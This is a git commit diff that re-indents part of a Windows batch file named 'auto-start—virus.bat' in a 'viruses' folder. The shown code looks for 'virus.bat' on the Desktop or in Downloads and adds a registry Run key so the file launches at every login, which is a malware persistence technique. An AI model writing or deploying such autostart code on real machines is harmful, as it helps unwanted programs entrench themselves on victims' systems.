1d223d6d5b9df3f447373cf5119cd8d36bc2f7cd
osager-net <RuslanGamidov2015@yandex.ru>
2026-05-03 21:03:14 +0400

    Update auto-start—virus.bat

--- viruses/auto-start—virus.bat
+++ viruses/auto-start—virus.bat
@@ -6,15 +6,15 @@ if %errorlevel% == 0 (
     goto :end
 ) else (
     :: (Переменные)
-set "filename=virus.bat"
-set "desktop=%USERPROFILE%\Desktop"
-set "downloads=%USERPROFILE%\Downloads"
+    set "filename=virus.bat"
+    set "desktop=%USERPROFILE%\Desktop"
+    set "downloads=%USERPROFILE%\Downloads"
 
-:: (Проверяем рабочий стол)
-if exist "%desktop%\%filename%" (
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%desktop%\%filename%" /f
-    goto :end
-)
+    :: (Проверяем рабочий стол)
+    if exist "%desktop%\%filename%" (
+        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%desktop%\%filename%" /f
+        goto :end
+    )
 
 :: (Проверяем загрузки)
 if exist "%downloads%\%filename%" (
